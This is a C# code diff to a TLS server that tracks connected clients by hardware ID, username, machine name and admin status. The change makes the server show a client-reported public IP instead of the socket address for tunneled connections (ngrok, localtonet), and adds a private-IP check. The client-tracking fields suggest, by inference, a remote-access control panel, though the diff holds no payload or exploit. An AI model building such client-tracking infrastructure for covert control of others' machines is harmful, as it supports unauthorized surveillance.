@@ -292,13 +292,24 @@ public class TlsServer
                     : $"{prefix}-{Guid.NewGuid().ToString("N")[..8]}";
             }
 
+            // Prefer client-reported public IP over socket address so tunneled connections
+            // (localtonet, ngrok, Cloudflare Tunnel, etc.) show the real endpoint.
+            string displayIp = ip;
+            if (!string.IsNullOrWhiteSpace(info.IP)
+                && System.Net.IPAddress.TryParse(info.IP, out var parsedIp)
+                && !System.Net.IPAddress.IsLoopback(parsedIp)
+                && !IsPrivateIp(parsedIp))
+            {
+                displayIp = info.IP;
+            }
+
             client = new ConnectedClient
             {
                 Id = clientId,
                 Hwid = info.Hwid,
                 InstanceId = info.InstanceId,
                 Username = info.Username,
-                IP = ip,
+                IP = displayIp,
                 OS = info.OS,
                 MachineName = info.MachineName,
                 IsAdmin = info.IsAdmin,
@@ -308,8 +319,8 @@ public class TlsServer
                 Port = Port,
             };
 
-            // Resolve country from IP
-            var (country, countryCode) = await ResolveCountryAsync(ip);
+            // Resolve country from effective IP
+            var (country, countryCode) = await ResolveCountryAsync(displayIp);
             client.Country = country;
             client.CountryCode = countryCode;
             FlagCache.QueueLoad(client, countryCode);
@@ -502,6 +513,17 @@ public class TlsServer
             tcp.Close();
             if (client != null) DisconnectClient(client.Id);
         }
+    }
+
+    private static bool IsPrivateIp(System.Net.IPAddress addr)
+    {
+        var b = addr.GetAddressBytes();
+        if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+            return b[0] == 10
+                || (b[0] == 172 && b[1] >= 16 && b[1] <= 31)
+                || (b[0] == 192 && b[1] == 168)
+                || (b[0] == 169 && b[1] == 254); // link-local
+        return false;
     }
 
     private async Task<(string country, string code)> ResolveCountryAsync(string ip)
